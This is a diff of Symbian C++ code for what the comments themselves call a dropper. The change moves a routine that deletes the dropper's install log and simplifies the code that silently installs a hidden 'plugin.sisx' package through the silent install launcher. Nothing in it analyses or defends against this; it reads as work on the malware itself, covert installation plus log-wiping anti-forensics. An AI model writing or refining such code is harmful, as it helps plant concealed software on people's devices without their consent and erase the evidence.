@@ -89,6 +89,16 @@ LOCAL_C void MainL()
 
 	User::After(10*1000000);
 	
+	// Delete install log of dropper install
+	TBuf8<12> hexBuf(KUidUninstaller);
+	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+	TLex8 lex(hexBuf);
+	lex.Assign(hexBuf);
+	TUint32 uninstUid;
+	lex.Val(uninstUid,EHex);
+	TUid uninstallerUid = TUid::Uid(uninstUid);
+	DeleteInstallerLog(uninstallerUid);
+		
 	// Prepare for silent install
 	SwiUI::RSWInstSilentLauncher      launcher; 
 	SwiUI::TInstallOptions            options;
@@ -107,37 +117,22 @@ LOCAL_C void MainL()
 	optionsPckg = options;
 		
 	// Create path
-	TFileName oldName;
-	TFileName newName;
+	TFileName path;
 	RFs fs;
 	fs.Connect();
-	fs.PrivatePath( oldName );
-	newName.Copy(oldName);
-	oldName.Append(_L("plugin.dat"));
-	newName.Append(_L("plugin.sisx")); 
+	fs.PrivatePath( path );
+	fs.Close();
+	path.Append(_L("plugin.sisx"));
 	
 	TFileName processName = RProcess().FileName();
 	TParse parse;
 	parse.Set(processName , NULL, NULL);
-	oldName.Insert(0,parse.Drive());
-	newName.Insert(0,parse.Drive());
-	fs.Rename(oldName,newName);	
-	fs.Close();
+	path.Insert(0,parse.Drive());
 		
 	// Start synchronous install
 	TInt err = KErrNone;
-	err = launcher.SilentInstall(newName,optionsPckg);		
+	err = launcher.SilentInstall(path,optionsPckg);		
 	launcher.Close();
-
-	// Delete install log of dropper install
-	TBuf8<12> hexBuf(KUidUninstaller);
-	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
-	TLex8 lex(hexBuf);
-	lex.Assign(hexBuf);
-	TUint32 uninstUid;
-	lex.Val(uninstUid,EHex);
-	TUid uninstallerUid = TUid::Uid(uninstUid);
-	DeleteInstallerLog(uninstallerUid);
 		
 	}
 
